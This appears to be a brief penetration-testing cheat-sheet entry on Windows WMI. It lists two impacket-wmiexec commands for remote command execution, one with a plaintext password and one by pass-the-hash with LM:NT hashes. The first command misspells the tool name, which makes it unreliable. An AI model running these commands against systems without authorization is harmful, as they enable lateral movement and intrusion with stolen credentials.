# WMI

WMI is a framework for managing Windows systems, allowing remote administration, data collection, and remote command execution.





## Impacket-wmiexec



{% code title="With pass" %}
```bash
imapcket-wmiexec DOMAIN/USER:'PASSWORD'@IP
```
{% endcode %}

{% code title="With Pass-the-Hash" overflow="wrap" %}
```bash
impacket-wmiexec USER@IP -hashes LM:NT 
```
{% endcode %}

